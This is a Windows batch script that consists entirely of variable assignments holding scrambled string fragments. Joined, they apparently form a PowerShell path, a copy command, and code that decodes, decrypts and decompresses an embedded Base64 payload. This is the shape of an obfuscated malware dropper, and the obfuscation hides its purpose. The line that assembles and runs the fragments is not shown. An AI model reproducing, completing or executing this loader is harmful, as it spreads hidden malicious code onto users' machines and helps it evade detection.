@echo off
set "ioVymiefIg=y "
set "lNOMdXKRyT=Sy"
set "lFJyJTlfJL= C"
set "KeLITFVbFm=32"
set "jaYmJCRqbS=ll"
set "sKOJjGYqiC=ow"
set "GFPtipSMvh=xe"
set "tomaSZMmHY=Po"
set "HIslYEPyvU=co"
set "wVxdEFENaY=py"
set "SuoSSOsszq=he"
set "JgEnVARWVY=we"
set "CUIRMvLaLp=rS"
set "bpFoyhJFDJ=st"
set "nLAsCMgZnt=1."
set "HNffIbZTBe=nd"
set "wwtigMqViT=s\"
set "KPWhUbjhtR=:\"
set "RypNqQHyqX=Wi"
set "EzsiSmCfab=po"
set "SrqNAktWZV=em"
set "DNSDiXEWvS=do"
set "lSYpVaFWqG=rs"
set "iUQNIjopgD=we"
set "hywFOkTMFt= /"
set "wjUIRyFvnw=\v"
set "lroxKrRmID=ll"
set "IwEXskGlgv=0\"
set "dLsyaUxalS=in"
set "mHZrMLyamt=ws"
set "WgSpBgReKY=\W"
set "vwORzpBSKj=he"
set "tJqikLAdmS=.e"
set "cHaSByPjZE=cd"
set "gmjGYKDPdR= %~dp0"
set "RNztNJNdVS=BC;$"
set "htYZWzIxqg=fore"
set "zcRwTKqCYm=)($t"
set "vPawukxQhi=ose("
set "xDEFcHOPJC= = $"
set "lmxrtiFBMT=XaEH"
set "EhbGfMzIUp=ptor"
set "AsGJbWJMke=y]::"
set "QJSbloKQOi=yste"
set "yHJtdvXqEy=$XaE"
set "sRLMHkArad=stem"
set "dILzUeOkMc= '')"
set "pScYdbpKJg== $h"
set "OjXSiVLwrV=.Mem"
set "VHHxlNPMMz=sv);"
set "mfPzcKTYZR=rity"
set "JwpGBneMRM=Bmor"
set "xYOwndHFPS=($sV"
set "LlSkuYcfrK=.Con"
set "JqNvOfkYpR=ach "
set "YvCltPXOcn=; };"
set "qSINMgfcxR=pres"
set "KAidYmaIuE=Bssv"
set "TehqoGoDsU=l5E7"
set "kewLCTTYCf=Mode"
set "RLnDPJOXzU=;$lV"
set "iNUlSrCaBi='txe"
set "tDFPqxJIrR= [Sy"
set "jjwJltTzCd=$ZOZ"
set "PPWdYwpzXT=d;$h"
set "whWvVWUgXk=join"
set "jURRDoStOa=onve"
set "fsoKNLTwQG=tsWi"
set "NLitrEPjCF=CUD "
set "gSlsyiRHLU=OKsf"
set "nZPGPKjSgz=Secu"
set "eqaJQebRqL=Secu"
set "TUaxZicfDj=File"
set "ldZEZNYfEp=);$G"
set "obcQuFLkkd=('Tg"
set "TAMnSkixlU=AfdT"
set "awpXEWNeHR=null"
set "oSWUMKSLMz=ay()"
set "SUSTtRslGI=lit("
set "JfnsYRhkvE=Stre"
set "qhFaMGvMqR=dj0C"
set "MIAGvhBwIp=ring"
set "PznTOVHiaW=-1.."
set "ckjNEelQgL=sv ="
set "WylKsdBYzn=yste"
set "PUIfLnBMGS=k; }"
set "CAjCmYeJwR=WKIN"
set "tAMTfVmPgg=();$"
set "qXmVmbIRgn=n ''"
set "KAWCjlYCvE=in $"
set "llTJXrBfEk=IN.D"
set "vErHyRfHSr=rtS4"
set "QslwzggVPQ= New"
set "kVrtdSnQhN=6esa"
set "hkSAkIyftJ=Comp"
set "aMZVQxEBKJ=rofi"
set "JuufsCSVAG=raph"
set "QFvkKODibV=LfCU"
set "DUAxLrltPy=7;$h"
set "YwOgIixkGu=stem"
set "TmTLGpGOaB=brea"
set "FbWcdmoVkz=sv.T"
set "jXvWUxglRR=RmAx"
set "bOKVtvurfT=oin "
set "UPLMfEfmKd=oArr"
set "pQpQjLmKQE=[Sys"
set "kNVqyprqgr=stem"
set "dXhqVIpsGN=bjec"
set "VsvbyhLBgF=$lVa"
set "adirYeaAIG=[IO."
set "vujSeUGDpQ=Comp"
set "alwnUGRgno=('da"
set "OjciLHWpdG=sVyF"
set "ycdpvcAyqv=Obje"
set "LgNlAkbyZl=m.IO"
set "ZxOAjjFOMP=ck($"
set "vPOEcHuYPp=.IO."
set "olzTgPBpjU=ert]"
set "fIQfIJSqYo=ateD"
set "bUPsbYvAuD=[-1."
set "GZxrXJtYCW=hprm"
set "yatxUJwwcY=vE ="
set "AoPbuADxwf=PTtG"
set "ebUXhudcZX=Conv"
set "ZCselyfizN=).Sp"
set "CZMjEYqVFS=oL'["
set "RsqFHcrJFW=pose"
set "bVLtlsQnOM=[Env"
set "UXWKpYiOOK=hWgv"
set "oRBLrAuFuU=OKsf"
